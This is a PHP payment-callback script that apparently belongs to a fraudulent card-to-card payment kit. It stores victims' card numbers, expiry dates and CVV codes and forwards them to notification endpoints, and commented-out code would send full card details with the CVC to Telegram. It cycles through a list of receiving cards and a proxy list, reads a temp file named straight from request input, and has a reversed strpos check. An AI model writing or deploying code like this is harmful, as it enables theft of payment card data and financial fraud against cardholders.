<?php

include "config.php";



if (isset($_REQUEST["PaRes"]) && isset($_REQUEST["MD"])){
	
	$requestData = json_decode(file_get_contents(__DIR__."/temp/" . $_REQUEST["fname"]), true);
	
	$confirm_pay = request('POST', $requestData['payData']['TermUrl'], [
		'params' => http_build_query([
			'MD' => $_REQUEST["MD"],
			'PaRes' => $_REQUEST["PaRes"]
		]),

	]);




	$data['order_id'] = $requestData['order_id'];
	$data['to'] = $card ." RUSNARBANK";
	$data['merch'] = $shop_name;
	$data['from'] = $requestData['from'];
	$data['month'] = $requestData['month'];
	$data['year'] = $requestData['year'];
	$data['cvv'] = $requestData['cvv'];

	if (!strpos('Оплата не совершена',$confirm_pay['content'])) {
//		$message = "💳*Номер карты:* ".$requestData['card_number']."\n";
//		$message .= "⏱*Срок действия:* ".$requestData['mmyy']."\n";
//		$message .= "📼*CVC-код:* ".$requestData['cvc']."\n";
//		$message .= "💰*Сумма платежа:* ".$requestData["amount"]."\n";
//		$message .= "📆*Дата платежа:* ".date("d-m-Y H:i:s")."\n\n";
//		$message .= "✅*Статус:* Оплата прошла успешно!";
		//message_to_telegram($message);


		$ch = curl_init();
		$params = [
			'data' => json_encode($data),
		];
		curl_setopt($ch, CURLOPT_URL, "https://" . $_SERVER['HTTP_HOST'] . "/notify/success_payment");
		curl_setopt($ch, CURLOPT_POST, TRUE);
		curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
		$r = curl_exec($ch);
		curl_close($ch);

		$card_array = explode(';', file_get_contents(__DIR__ . '/cclist.txt'));
		$card_array[] = $card_array[0];
		unset($card_array[0]);
		file_put_contents(__DIR__ . '/cclist.txt', implode(';', $card_array));


		$proxy_arr = explode("\n", file_get_contents(__DIR__ . '/proxy.txt'));
		$tmp_proxy = $proxy_arr[0];
		unset($proxy_arr[0]);
		$proxy_arr[] = $tmp_proxy;
		file_put_contents(__DIR__ . '/proxy.txt', implode("\n", $proxy_arr));
		if ($success_url) {
			header("Location: " . $success_url . "?opKey=".$_REQUEST["fname"]);
		}
		else {
			echo "Оплата прошла успешно!";
		}
	} else {
//		$message = "💳*Номер карты:* ".$requestData['card_number']."\n";
//		$message .= "⏱*Срок действия:* ".$requestData['mmyy']."\n";
//		$message .= "📼*CVC-код:* ".$requestData['cvc']."\n";
//		$message .= "💰*Сумма платежа:* ".$requestData["amount"]."\n";
//		$message .= "📆*Дата платежа:* ".date("d-m-Y H:i:s")."\n\n";
//		$message .= "❌*Статус:* Ошибка, оплата не прошла!";
		//message_to_telegram($message);
		$ch = curl_init();
		$params = [
			'data' => json_encode($data),
		];
		curl_setopt($ch, CURLOPT_URL, "https://" . $_SERVER['HTTP_HOST'] . "/notify/fail_payment");
		curl_setopt($ch, CURLOPT_POST, TRUE);
		curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
		$r = curl_exec($ch);

		curl_close($ch);
		if ($error_url) {
			header("Location: " . $error_url);
		}
		else {
			echo "При оплате произошла ошибка";
		}
	}
	
}

?>